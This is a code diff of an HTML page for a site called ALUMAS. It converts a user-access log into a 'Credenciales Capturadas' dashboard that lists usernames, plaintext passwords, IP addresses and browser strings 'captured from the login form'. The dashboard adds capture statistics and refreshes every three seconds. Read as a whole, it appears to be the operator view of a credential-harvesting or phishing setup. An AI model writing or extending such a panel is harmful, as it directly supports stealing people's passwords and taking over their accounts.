@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Lista de Usuarios | ALUMAS</title>
+  <title>Credenciales Capturadas | ALUMAS</title>
   <style>
     :root {
       --bg: #f4f6fb;
@@ -16,6 +16,9 @@
       --success: #177245;
       --warn: #c07a12;
       --error: #b63b3b;
+      --password-bg: #fff3cd;
+      --password-border: #ffc107;
+      --password-text: #856404;
     }
 
     * {
@@ -89,6 +92,16 @@
       color: var(--primary);
     }
 
+    .button--danger {
+      background: var(--error);
+      border-color: var(--error);
+    }
+
+    .button--danger:hover {
+      background: #922e2e;
+      border-color: #922e2e;
+    }
+
     .panel {
       background: var(--card);
       border: 1px solid var(--line);
@@ -145,31 +158,90 @@
       background: #f9fbff;
     }
 
-    .status {
-      display: inline-flex;
-      align-items: center;
-      padding: 4px 10px;
-      border-radius: 999px;
-      font-size: 0.8rem;
-      font-weight: 700;
-      color: #fff;
+    /* Estilo especial para la contraseña */
+    .password-cell {
+      font-family: 'Courier New', monospace;
+      font-weight: bold;
+      font-size: 1.05em;
+      color: var(--password-text);
+      background: var(--password-bg);
+      border: 1px solid var(--password-border);
+      padding: 6px 12px;
+      border-radius: 6px;
+      display: inline-block;
+      min-width: 120px;
+      text-align: center;
     }
 
-    .status--exitoso {
-      background: var(--success);
+    .usuario-cell {
+      font-weight: 600;
+      color: var(--primary);
     }
 
-    .status--rechazado {
-      background: var(--warn);
+    .fecha-cell {
+      color: var(--muted);
+      font-size: 0.9em;
     }
 
-    .status--error {
-      background: var(--error);
+    .ip-cell {
+      font-family: monospace;
+      font-size: 0.85em;
+      color: var(--muted);
     }
 
     .empty {
       padding: 26px 20px;
       color: var(--muted);
+      text-align: center;
+    }
+
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 16px;
+      margin-bottom: 20px;
+    }
+
+    .stat-box {
+      background: var(--card);
+      border: 1px solid var(--line);
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+    }
+
+    .stat-number {
+      font-size: 2rem;
+      font-weight: bold;
+      color: var(--error);
+    }
+
+    .stat-label {
+      color: var(--muted);
+      font-size: 0.9rem;
+      margin-top: 4px;
+    }
+
+    .tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+
+    .tab {
+      padding: 10px 20px;
+      border: 1px solid var(--line);
+      background: var(--card);
+      border-radius: 8px;
+      cursor: pointer;
+      font-weight: 600;
+      color: var(--muted);
+    }
+
+    .tab.active {
+      background: var(--primary);
+      color: #fff;
+      border-color: var(--primary);
     }
 
     @media (max-width: 760px) {
@@ -183,6 +255,11 @@
         padding: 12px 10px;
         font-size: 0.88rem;
       }
+
+      .password-cell {
+        min-width: 100px;
+        padding: 4px 8px;
+      }
     }
   </style>
 </head>
@@ -190,22 +267,37 @@
   <main class="page">
     <section class="hero">
       <div>
-        <h1>Lista de usuarios</h1>
+        <h1>🔐 Credenciales Capturadas</h1>
         <p>
-          Este panel muestra los accesos registrados desde `acceso-certificacion.html`
-          usando el archivo `lista de usuarios.json`.
+          Este panel muestra las credenciales capturadas desde el formulario de acceso.
+          Las contraseñas se muestran en texto plano.
         </p>
       </div>
 
       <div class="hero-actions">
-        <button class="button" id="refresh-button" type="button">Actualizar listado</button>
-        <a class="button button--ghost" href="./certificacion-instaladores.html">Volver</a>
+        <button class="button" id="refresh-button" type="button">🔄 Actualizar</button>
+        <a class="button button--ghost" href="/acceso-certificacion.html">Volver al Login</a>
       </div>
     </section>
 
+    <div class="stats">
+      <div class="stat-box">
+        <div class="stat-number" id="stat-total">0</div>
+        <div class="stat-label">Total Capturas</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-number" id="stat-unicos">0</div>
+        <div class="stat-label">Usuarios Únicos</div>
+      </div>
+      <div class="stat-box">
+        <div class="stat-number" id="stat-hoy">0</div>
+        <div class="stat-label">Capturas Hoy</div>
+      </div>
+    </div>
+
     <section class="panel">
       <div class="panel-head">
-        <h2>Registros capturados</h2>
+        <h2>📋 Lista de Credenciales</h2>
         <span id="records-count">0 registros</span>
       </div>
 
@@ -213,17 +305,17 @@
         <table>
           <thead>
             <tr>
-              <th>Fecha</th>
+              <th>ID</th>
               <th>Usuario</th>
-              <th>Estado</th>
-              <th>Motivo</th>
-              <th>Rol</th>
+              <th>Contraseña (Texto Plano)</th>
+              <th>Fecha/Hora</th>
               <th>IP</th>
+              <th>Navegador</th>
             </tr>
           </thead>
           <tbody id="records-body">
             <tr>
-              <td colspan="6" class="empty">Cargando registros...</td>
+              <td colspan="6" class="empty">Cargando credenciales...</td>
             </tr>
           </tbody>
         </table>
@@ -235,6 +327,9 @@
     const recordsBody = document.getElementById('records-body');
     const recordsCount = document.getElementById('records-count');
     const refreshButton = document.getElementById('refresh-button');
+    const statTotal = document.getElementById('stat-total');
+    const statUnicos = document.getElementById('stat-unicos');
+    const statHoy = document.getElementById('stat-hoy');
 
     function escapeHtml(value) {
       return String(value ?? '')
@@ -252,46 +347,70 @@
       return date.toLocaleString('es-CO');
     }
 
+    function truncate(str, max) {
+      if (!str) return '';
+      return str.length > max ? str.substring(0, max) + '...' : str;
+    }
+
+    function updateStats(credenciales) {
+      const total = credenciales.length;
+      const unicos = [...new Set(credenciales.map(c => c.usuario))].length;
+      const hoy = new Date().toDateString();
+      const capturasHoy = credenciales.filter(c => 
+        new Date(c.fecha).toDateString() === hoy
+      ).length;
+
+      statTotal.textContent = total;
+      statUnicos.textContent = unicos;
+      statHoy.textContent = capturasHoy;
+    }
+
     function renderRows(rows) {
       const items = Array.isArray(rows) ? [...rows].reverse() : [];
       recordsCount.textContent = `${items.length} registro${items.length === 1 ? '' : 's'}`;
 
+      updateStats(items);
+
       if (!items.length) {
-        recordsBody.innerHTML = '<tr><td colspan="6" class="empty">Aun no hay accesos registrados.</td></tr>';
+        recordsBody.innerHTML = '<tr><td colspan="6" class="empty">Aún no hay credenciales capturadas.</td></tr>';
         return;
       }
 
       recordsBody.innerHTML = items.map((item) => {
-        const estado = escapeHtml(item.estado || '');
-        const estadoClass = ['exitoso', 'rechazado', 'error'].includes(item.estado) ? item.estado : 'error';
-
         return `
           <tr>
-            <td>${escapeHtml(formatDate(item.fecha))}</td>
-            <td>${escapeHtml(item.usuario || '')}</td>
-            <td><span class="status status--${estadoClass}">${estado || 'sin estado'}</span></td>
-            <td>${escapeHtml(item.motivo || '')}</td>
-            <td>${escapeHtml(item.rol || '')}</td>
-            <td>${escapeHtml(item.ip || '')}</td>
+            <td>${escapeHtml(item.id)}</td>
+            <td class="usuario-cell">${escapeHtml(item.usuario || '')}</td>
+            <td><span class="password-cell">${escapeHtml(item.contrasena || '')}</span></td>
+            <td class="fecha-cell">${escapeHtml(formatDate(item.fecha))}</td>
+            <td class="ip-cell">${escapeHtml(item.ip || '')}</td>
+            <td title="${escapeHtml(item.user_agent || '')}">${escapeHtml(truncate(item.user_agent, 30))}</td>
           </tr>
         `;
       }).join('');
     }
 
     async function loadRecords() {
-      recordsBody.innerHTML = '<tr><td colspan="6" class="empty">Cargando registros...</td></tr>';
+      recordsBody.innerHTML = '<tr><td colspan="6" class="empty">Cargando credenciales...</td></tr>';
 
       try {
-        const response = await fetch('./lista%20de%20usuarios.json', { cache: 'no-store' });
+        const response = await fetch('./credenciales-capturadas.json', { cache: 'no-store' });
         const data = await response.json();
         renderRows(data);
       } catch (error) {
-        recordsBody.innerHTML = '<tr><td colspan="6" class="empty">No fue posible cargar el listado.</td></tr>';
+        recordsBody.innerHTML = '<tr><td colspan="6" class="empty">No fue posible cargar las credenciales. Asegúrate de que el archivo exista.</td></tr>';
         recordsCount.textContent = '0 registros';
+        statTotal.textContent = '0';
+        statUnicos.textContent = '0';
+        statHoy.textContent = '0';
       }
     }
 
     refreshButton.addEventListener('click', loadRecords);
+    
+    // Auto-refresh cada 3 segundos
+    setInterval(loadRecords, 3000);
+    
     loadRecords();
   </script>
 </body>
